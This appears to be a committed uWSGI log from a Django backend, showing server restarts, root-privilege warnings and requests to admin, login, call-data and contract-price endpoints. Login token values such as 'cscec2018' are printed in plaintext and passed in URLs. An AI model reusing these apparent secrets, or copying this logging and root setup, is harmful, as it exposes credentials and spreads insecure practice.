+[pid: 28837|app: 0|req: 11/16] 61.191.198.244 () {40 vars in 736 bytes} [Wed Nov 28 14:40:47 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28838|app: 0|req: 6/17] 61.191.198.244 () {44 vars in 816 bytes} [Wed Nov 28 14:40:54 2018] GET /admin/logout/ => generated 1208 bytes in 81 msecs (HTTP/1.1 200) 7 headers in 312 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 12/18] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:40:55 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28838|app: 0|req: 7/19] 61.191.198.244 () {44 vars in 765 bytes} [Wed Nov 28 14:40:57 2018] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 13/20] 61.191.198.244 () {44 vars in 802 bytes} [Wed Nov 28 14:40:57 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 12 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 14/21] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:40:59 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+Wed Nov 28 14:52:03 2018 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:52:03 2018 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:52:03 2018 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:52:03 2018 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:55:40 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+writing pidfile to /home/www/django-backend-template/pid.uwsgi
+open("/home/www/django-backend-template/pid.uwsgi"): No such file or directory [core/utils.c line 3613]
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:57:20 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+writing pidfile to /home/www/django-backend-template/pid.uwsgi
+open("/home/www/django-backend-template/pid.uwsgi"): No such file or directory [core/utils.c line 3613]
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:58:47 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x5638ae365110
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5638ae365110 pid: 29016 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 29016)
+spawned uWSGI worker 1 (pid: 29018, cores: 2)
+spawned uWSGI worker 2 (pid: 29019, cores: 2)
+[pid: 29019|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 748 bytes} [Wed Nov 28 14:58:55 2018] GET /admin/ => generated 0 bytes in 115 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 0)
+[pid: 29019|app: 0|req: 2/2] 61.191.198.244 () {44 vars in 785 bytes} [Wed Nov 28 14:58:56 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 95 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 1/3] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:58:57 2018] GET /favicon.ico => generated 85 bytes in 52 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 2/4] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:58:58 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 3/5] 61.191.198.244 () {44 vars in 785 bytes} [Wed Nov 28 15:00:19 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 105 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 4/6] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 15:00:21 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29019|app: 0|req: 3/7] 61.191.198.244 () {48 vars in 931 bytes} [Wed Nov 28 15:00:31 2018] POST /admin/login/?next=/admin/ => generated 0 bytes in 174 msecs (HTTP/1.1 302) 9 headers in 567 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 5/8] 61.191.198.244 () {44 vars in 821 bytes} [Wed Nov 28 15:00:31 2018] GET /admin/ => generated 8150 bytes in 108 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 6/9] 61.191.198.244 () {40 vars in 736 bytes} [Wed Nov 28 15:00:32 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 7/10] 178.156.83.167 () {32 vars in 458 bytes} [Wed Nov 28 15:14:31 2018] GET / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29019|app: 0|req: 4/11] 197.232.69.193 () {32 vars in 459 bytes} [Wed Nov 28 15:25:50 2018] GET / => generated 74 bytes in 81 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 8/12] 87.251.81.86 () {36 vars in 485 bytes} [Wed Nov 28 15:28:56 2018] GET /admin/assets/js/views/login.js => generated 104 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 115 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 9/13] 61.191.198.244 () {42 vars in 773 bytes} [Wed Nov 28 15:47:34 2018] GET /server/admin => generated 86 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 10/14] 61.191.198.244 () {42 vars in 775 bytes} [Wed Nov 28 15:47:40 2018] GET /server/admin/ => generated 87 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 11/15] 61.191.198.244 () {42 vars in 763 bytes} [Wed Nov 28 15:48:35 2018] GET /server/ => generated 81 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 12/16] 61.191.198.244 () {42 vars in 763 bytes} [Wed Nov 28 15:48:37 2018] GET /server/ => generated 81 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 13/17] 61.191.198.244 () {44 vars in 794 bytes} [Wed Nov 28 15:49:19 2018] GET /server/ => generated 81 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 14/18] 61.191.198.244 () {44 vars in 794 bytes} [Wed Nov 28 15:51:35 2018] GET /server/ => generated 81 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 15/19] 61.191.198.244 () {44 vars in 792 bytes} [Wed Nov 28 15:53:18 2018] GET /admin/ => generated 8150 bytes in 48 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 16/20] 61.191.198.244 () {42 vars in 767 bytes} [Wed Nov 28 15:53:19 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 17/21] 61.191.198.244 () {42 vars in 775 bytes} [Wed Nov 28 15:54:06 2018] GET /server/admin/ => generated 87 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29018|app: 0|req: 18/22] 61.191.198.244 () {40 vars in 736 bytes} [Wed Nov 28 15:54:07 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29018|app: 0|req: 19/23] 61.191.198.244 () {44 vars in 794 bytes} [Wed Nov 28 15:55:43 2018] GET /server/ => generated 81 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 07:59:55 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x5593f50ac110
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5593f50ac110 pid: 29370 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 29370)
+spawned uWSGI worker 1 (pid: 29372, cores: 2)
+spawned uWSGI worker 2 (pid: 29373, cores: 2)
+[pid: 29373|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 794 bytes} [Wed Nov 28 16:00:01 2018] GET /server/ => generated 81 bytes in 51 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29373|app: 0|req: 2/2] 61.191.198.244 () {44 vars in 794 bytes} [Wed Nov 28 16:00:18 2018] GET /server/ => generated 81 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29373|app: 0|req: 3/3] 61.191.198.244 () {42 vars in 773 bytes} [Wed Nov 28 16:00:35 2018] GET /server/admin => generated 0 bytes in 3 msecs (HTTP/1.1 301) 4 headers in 133 bytes (1 switches on core 0)
+[pid: 29372|app: 0|req: 1/4] 61.191.198.244 () {42 vars in 775 bytes} [Wed Nov 28 16:00:35 2018] GET /server/admin/ => generated 8395 bytes in 237 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
+[pid: 29373|app: 0|req: 4/5] 61.191.198.244 () {42 vars in 763 bytes} [Wed Nov 28 16:10:03 2018] GET /server/ => generated 81 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29372|app: 0|req: 2/6] 61.191.198.244 () {42 vars in 775 bytes} [Wed Nov 28 16:10:08 2018] GET /server/admin/ => generated 8395 bytes in 39 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 1)
+[pid: 29373|app: 0|req: 5/7] 61.191.198.244 () {42 vars in 775 bytes} [Wed Nov 28 16:10:15 2018] GET /server/admin/ => generated 8395 bytes in 156 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
+[pid: 29373|app: 0|req: 6/8] 61.191.198.244 () {44 vars in 806 bytes} [Wed Nov 28 16:15:58 2018] GET /server/admin/ => generated 8395 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 08:26:52 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x55ee5fe9a110
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ee5fe9a110 pid: 29743 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 29743)
+spawned uWSGI worker 1 (pid: 29745, cores: 2)
+spawned uWSGI worker 2 (pid: 29746, cores: 2)
+[pid: 29746|app: 0|req: 1/1] 61.191.198.244 () {42 vars in 768 bytes} [Wed Nov 28 16:27:30 2018] GET /admin/ => generated 8150 bytes in 194 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 2/2] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:27:34 2018] GET /favicon.ico => generated 85 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 3/3] 61.191.198.244 () {44 vars in 738 bytes} [Wed Nov 28 16:37:56 2018] OPTIONS /user/login => generated 0 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+{'code': 50008, 'data': {'token': 'admin'}}
+[pid: 29746|app: 0|req: 4/4] 61.191.198.244 () {46 vars in 755 bytes} [Wed Nov 28 16:37:56 2018] POST /user/login => generated 43 bytes in 213 msecs (HTTP/1.1 200) 6 headers in 203 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 5/5] 185.153.198.208 () {38 vars in 490 bytes} [Wed Nov 28 16:38:06 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 29746|app: 0|req: 6/6] 61.191.198.244 () {46 vars in 755 bytes} [Wed Nov 28 16:38:20 2018] POST /user/login => generated 43 bytes in 183 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 7/7] 61.191.198.244 () {44 vars in 753 bytes} [Wed Nov 28 16:38:20 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 1/8] 61.191.198.244 () {44 vars in 688 bytes} [Wed Nov 28 16:38:21 2018] GET /user/info?token=admin => generated 144 bytes in 50 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 2/9] 61.191.198.244 () {44 vars in 768 bytes} [Wed Nov 28 16:38:34 2018] OPTIONS /contract/price/detail => generated 0 bytes in 3 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 8/10] 61.191.198.244 () {48 vars in 798 bytes} [Wed Nov 28 16:38:35 2018] POST /contract/price/detail => generated 14895 bytes in 18 msecs (HTTP/1.1 200) 6 headers in 206 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 9/11] 61.191.198.244 () {44 vars in 735 bytes} [Wed Nov 28 16:39:37 2018] OPTIONS /user/logout => generated 0 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 10/12] 61.191.198.244 () {46 vars in 695 bytes} [Wed Nov 28 16:39:37 2018] POST /user/logout => generated 34 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 211 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 11/13] 61.191.198.244 () {42 vars in 768 bytes} [Wed Nov 28 16:40:46 2018] GET /admin/ => generated 8150 bytes in 46 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 12/14] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:40:46 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 3/15] 61.191.198.244 () {44 vars in 834 bytes} [Wed Nov 28 16:40:56 2018] GET /admin/auth/user/ => generated 7070 bytes in 274 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 4/16] 61.191.198.244 () {42 vars in 743 bytes} [Wed Nov 28 16:40:57 2018] GET /admin/jsi18n/ => generated 7684 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 140 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 13/17] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:40:59 2018] GET /favicon.ico => generated 85 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 14/18] 61.191.198.244 () {44 vars in 862 bytes} [Wed Nov 28 16:41:02 2018] GET /admin/auth/user/2/change/ => generated 15281 bytes in 145 msecs (HTTP/1.1 200) 7 headers in 404 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 15/19] 61.191.198.244 () {42 vars in 752 bytes} [Wed Nov 28 16:41:02 2018] GET /admin/jsi18n/ => generated 7684 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 140 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 16/20] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:03 2018] GET /favicon.ico => generated 85 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 5/21] 61.191.198.244 () {48 vars in 988 bytes} [Wed Nov 28 16:41:26 2018] POST /admin/auth/user/2/change/ => generated 0 bytes in 47 msecs (HTTP/1.1 302) 8 headers in 517 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 17/22] 61.191.198.244 () {44 vars in 1061 bytes} [Wed Nov 28 16:41:27 2018] GET /admin/auth/user/ => generated 7239 bytes in 48 msecs (HTTP/1.1 200) 8 headers in 487 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 6/23] 61.191.198.244 () {42 vars in 743 bytes} [Wed Nov 28 16:41:27 2018] GET /admin/jsi18n/ => generated 7684 bytes in 8 msecs (HTTP/1.1 200) 4 headers in 140 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 18/24] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:28 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 7/25] 61.191.198.244 () {44 vars in 834 bytes} [Wed Nov 28 16:41:39 2018] GET /admin/auth/ => generated 2879 bytes in 26 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 19/26] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:39 2018] GET /favicon.ico => generated 85 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 8/27] 61.191.198.244 () {44 vars in 819 bytes} [Wed Nov 28 16:41:41 2018] GET /admin/ => generated 8436 bytes in 31 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 20/28] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:42 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 21/29] 61.191.198.244 () {44 vars in 850 bytes} [Wed Nov 28 16:41:43 2018] GET /admin/login/extend_user/ => generated 4592 bytes in 30 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 22/30] 61.191.198.244 () {42 vars in 751 bytes} [Wed Nov 28 16:41:44 2018] GET /admin/jsi18n/ => generated 7684 bytes in 9 msecs (HTTP/1.1 200) 4 headers in 140 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 23/31] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:44 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 9/32] 61.191.198.244 () {44 vars in 886 bytes} [Wed Nov 28 16:41:46 2018] GET /admin/login/extend_user/2/change/ => generated 6980 bytes in 55 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 10/33] 61.191.198.244 () {42 vars in 760 bytes} [Wed Nov 28 16:41:46 2018] GET /admin/jsi18n/ => generated 7684 bytes in 9 msecs (HTTP/1.1 200) 4 headers in 140 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 24/34] 61.191.198.244 () {40 vars in 743 bytes} [Wed Nov 28 16:41:47 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'cscec2018'}}
+[pid: 29746|app: 0|req: 25/35] 61.191.198.244 () {46 vars in 755 bytes} [Wed Nov 28 16:52:59 2018] POST /user/login => generated 47 bytes in 219 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 26/36] 61.191.198.244 () {44 vars in 761 bytes} [Wed Nov 28 16:53:00 2018] OPTIONS /user/info?token=cscec2018 => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 11/37] 61.191.198.244 () {44 vars in 700 bytes} [Wed Nov 28 16:53:00 2018] GET /user/info?token=cscec2018 => generated 144 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 12/38] 61.191.198.244 () {44 vars in 746 bytes} [Wed Nov 28 16:53:08 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 27/39] 61.191.198.244 () {44 vars in 685 bytes} [Wed Nov 28 16:53:08 2018] GET /data/calllistinfo => generated 565 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 28/40] 61.191.198.244 () {44 vars in 685 bytes} [Wed Nov 28 16:53:13 2018] GET /data/calllistinfo => generated 565 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 13/41] 61.191.198.244 () {44 vars in 768 bytes} [Wed Nov 28 16:53:14 2018] OPTIONS /data/call-detail-list => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 14/42] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 16:53:15 2018] POST /data/call-detail-list => generated 4795 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 205 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 15/43] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 16:53:23 2018] POST /data/call-detail-list => generated 485 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 29/44] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 16:53:36 2018] POST /contract/price/detail => generated 14895 bytes in 16 msecs (HTTP/1.1 200) 6 headers in 206 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 30/45] 61.191.198.244 () {44 vars in 685 bytes} [Wed Nov 28 16:55:46 2018] GET /data/calllistinfo => generated 565 bytes in 14 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 31/46] 61.191.198.244 () {44 vars in 685 bytes} [Wed Nov 28 16:56:00 2018] GET /data/calllistinfo => generated 565 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 32/47] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 17:00:35 2018] POST /contract/price/detail => generated 15891 bytes in 14 msecs (HTTP/1.1 200) 6 headers in 206 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 33/48] 185.153.198.208 () {38 vars in 490 bytes} [Wed Nov 28 17:02:13 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 34/49] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 17:02:35 2018] POST /contract/price/detail => generated 64266 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 206 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 35/50] 61.191.198.244 () {48 vars in 802 bytes} [Wed Nov 28 17:03:03 2018] POST /contract/price/detail => generated 14137 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 206 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 36/51] 61.191.198.244 () {44 vars in 700 bytes} [Wed Nov 28 17:04:08 2018] GET /user/info?token=cscec2018 => generated 144 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 37/52] 61.191.198.244 () {48 vars in 776 bytes} [Wed Nov 28 17:06:44 2018] OPTIONS /user/login => generated 0 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+{'code': 50008, 'data': {'token': 'admin'}}
